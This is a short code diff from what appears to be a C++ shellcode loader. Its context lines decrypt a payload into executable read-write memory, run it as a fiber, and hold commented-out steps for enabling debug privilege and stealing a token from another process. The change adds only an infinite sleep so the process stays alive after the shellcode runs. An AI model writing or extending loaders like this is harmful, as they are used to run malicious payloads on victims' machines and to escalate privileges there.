@@ -72,6 +72,7 @@ int main() {
 	pt.pagePermissions = PAGE_EXECUTE_READWRITE;
 	shellcodeFiber = ProcHelper::CreateFiberShellcode(dec_buf, sizeOfShellcode, &pt);
 	ProcHelper::RunFiberShellcode(shellcodeFiber, &pt);// do your own damn scheduling
+	Sleep(INFINITE);
 	//std::cout << "attempting to steal token and create new thread" << std::endl;
 	//ProcHelper::EnableDebugPriv();
 	//ProcHelper::PESetTokenFromPID(pe);
